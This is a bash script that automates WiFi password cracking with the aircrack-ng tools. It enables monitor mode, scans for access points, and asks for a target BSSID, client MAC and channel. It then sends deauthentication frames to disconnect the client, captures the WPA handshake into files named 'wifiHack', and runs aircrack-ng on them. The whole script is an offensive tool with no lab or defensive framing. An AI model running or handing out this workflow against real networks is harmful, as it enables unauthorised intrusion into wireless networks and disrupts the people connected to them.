#!/bin/bash
#sleep 30s
#timeout 30


echo "Starting Airmon"
sudo airmon-ng
echo "Interface Found"
sudo airmon-ng start wlo1
echo "Starting Airodump"
gnome-terminal --title="Airodump" -- sudo timeout 1m airodump-ng -w allwifi --output-format csv wlo1mon
echo "Choose AP(BSSID) to crack"
echo "Enter BSSID"
read BSSID
echo "Station MAC"
read CLIENT
echo "Enter Channel"
read CH
gnome-terminal --title="Airodump $BSSID" -- sudo airodump-ng wlo1mon --bssid $BSSID -c $CH -w wifiHack
echo "Starting airoplay to disconnect client and capture Handshake"
sudo aireplay-ng -0 20 -a $BSSID -c $CLIENT wlo1mon
echo "Check Airodump Terminal if handshake captured or not"
echo "Handshake Captured(y):"
read INP
echo "Stopping Airmon"
airmon-ng stop wlo1mon
echo "Starting Aircrack"
aircrack-ng wifiHack*.cap


